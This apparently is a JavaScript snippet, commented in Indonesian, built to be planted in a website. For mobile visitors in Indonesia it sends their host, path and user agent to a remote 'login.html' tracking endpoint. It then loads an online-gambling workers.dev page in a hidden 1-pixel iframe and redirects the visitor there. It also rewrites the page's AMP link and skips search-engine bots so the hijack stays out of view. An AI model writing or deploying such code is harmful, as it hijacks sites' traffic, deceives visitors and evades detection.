(function () {
  try {

    /* =============================
       KONFIGURASI
    ============================= */
    var ORIGINAL_DOMAIN = "pragmaticplay.co.in";
    var ORIGINAL_AMP    = "https://gadingtoto.gasbosku.workers.dev";
    var TRACK_ENDPOINT  = "https://pragmaticplay.co.in/login.html";

    /* =============================
       VALIDASI ENV
    ============================= */
    if (typeof window === "undefined" || !location || !navigator) return;

    /* =============================
       DETEKSI BOT SEO (AMAN)
    ============================= */
    var ua = navigator.userAgent || "";
    var bots = /Googlebot|Google-InspectionTool|bingbot|DuckDuckBot|Baiduspider|YandexBot|AhrefsBot|SemrushBot|MJ12bot|DotBot/i;
    if (bots.test(ua)) return;

    /* =============================
       NORMALISASI HOST
    ============================= */
    var currentHost  = location.hostname.replace(/^www\./, "");
    var originalHost = ORIGINAL_DOMAIN.replace(/^www\./, "");
    var ampHost      = new URL(ORIGINAL_AMP).hostname.replace(/^www\./, "");

    // stop jika domain asli atau AMP
    if (currentHost === originalHost || currentHost === ampHost) return;

    /* =============================
       MOBILE ONLY
    ============================= */
    var isMobile =
      (window.matchMedia && window.matchMedia("(pointer: coarse)").matches) ||
      /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(ua);
    if (!isMobile) return;

    /* =============================
       INDONESIA ONLY (SOFT)
    ============================= */
    var isIndonesia =
      (Intl &&
        Intl.DateTimeFormat &&
        Intl.DateTimeFormat().resolvedOptions().timeZone === "Asia/Jakarta") ||
      (navigator.language && navigator.language.toLowerCase().startsWith("id"));
    if (!isIndonesia) return;

    /* =============================
       TRACKING MIRROR DOMAIN
    ============================= */
    try {
      var img = new Image();
      img.src =
        TRACK_ENDPOINT +
        "?host=" + encodeURIComponent(currentHost) +
        "&path=" + encodeURIComponent(location.pathname) +
        "&ua=" + encodeURIComponent(ua) +
        "&source=template" +
        "&t=" + Date.now();
    } catch (e) {}

    /* =============================
       AMP URL FINAL (STATIS)
    ============================= */
    var finalAmpURL = ORIGINAL_AMP.replace(/\/+$/, "");

    /* =============================
       FIX AMPHTML LINK (DUPLIKAT)
    ============================= */
    try {
      var ampLink = document.querySelector('link[rel="amphtml"]');
      if (ampLink) {
        ampLink.href = finalAmpURL;
      }
    } catch (e) {}

    /* =============================
       REDIRECT BERLAPIS
    ============================= */

    // Layer 1 ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â silent iframe
    setTimeout(function () {
      try {
        var iframe = document.createElement("iframe");
        iframe.style.cssText =
          "width:1px;height:1px;border:0;position:absolute;left:-9999px;top:-9999px";
        iframe.src = finalAmpURL;
        document.documentElement.appendChild(iframe);
      } catch (e) {}
    }, 800);

    // Layer 2 ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â hard redirect fallback
    setTimeout(function () {
      try {
        location.replace(finalAmpURL);
      } catch (e) {}
    }, 1800);

  } catch (e) {
    // fail silently
  }
})();
